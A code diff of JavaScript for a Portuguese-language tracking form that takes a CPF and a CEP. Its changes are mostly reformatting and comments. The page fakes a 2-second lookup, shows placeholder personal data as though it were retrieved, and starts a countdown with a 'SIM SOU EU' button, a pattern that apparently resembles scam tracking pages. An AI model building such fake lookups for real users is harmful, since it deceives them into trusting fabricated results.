@@ -902,9 +902,7 @@
 
     let intervalContagem;
 
-    document
-      .getElementById("form-rastreamento")
-      .addEventListener("submit", async function (event) {
+    document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
         event.preventDefault();
 
         const cpfInput = document.getElementById("cpf");
@@ -931,46 +929,43 @@
             cepInput.classList.remove('error');
         }
 
+        // Mostra o loading
         document.getElementById("botao-container").style.display = "none";
         document.getElementById("loading-container").style.display = "block";
 
+        // Simula uma consulta demorada (2 segundos)
         await new Promise((resolve) => setTimeout(resolve, 2000));
 
         const dadosPessoa = {
-          nome: "Cliente Exemplo",
-          cpf: formatarCPF(cpfRaw),
-          nascimento: "01/01/1980",
-          cep: formatarCEP(cepRaw),
-          rua: "-",
-          bairro: "-",
-          cidade: "São Paulo",
-          estado: "SP",
+            nome: "Cliente Exemplo",
+            cpf: formatarCPF(cpfRaw),
+            nascimento: "01/01/1980",
+            cep: formatarCEP(cepRaw),
+            rua: "-",
+            bairro: "-",
+            cidade: "São Paulo",
+            estado: "SP",
         };
 
+        // Preenche os dados na tela de resultado
         document.getElementById("res-nome").textContent = dadosPessoa.nome;
         document.getElementById("res-cpf").textContent = dadosPessoa.cpf;
-        document.getElementById("res-nascimento").textContent =
-          dadosPessoa.nascimento;
+        document.getElementById("res-nascimento").textContent = dadosPessoa.nascimento;
         document.getElementById("res-cep").textContent = dadosPessoa.cep;
-
-        // Deixa rua e bairro vazios
         document.getElementById("res-rua").textContent = "";
         document.getElementById("res-bairro").textContent = "";
-
         document.getElementById("res-cidade").textContent = dadosPessoa.cidade;
         document.getElementById("res-estado").textContent = dadosPessoa.estado;
 
+        // Esconde o loading e mostra o resultado
         document.getElementById("loading-container").style.display = "none";
         document.getElementById("tela-formulario").style.display = "none";
         document.getElementById("resultado").style.display = "block";
 
-        // Atualiza informações na caixa
-        atualizarInfoCaixa(dadosPessoa);
-
-        // Inicia a contagem regressiva imediatamente
+        // Inicia a contagem regressiva
         atualizarContagemRegressiva();
         intervalContagem = setInterval(atualizarContagemRegressiva, 1000);
-      });
+    });
 
     // Script para o botão "SIM SOU EU"
     document.getElementById("btn-sim-sou-eu").addEventListener("click", function() {
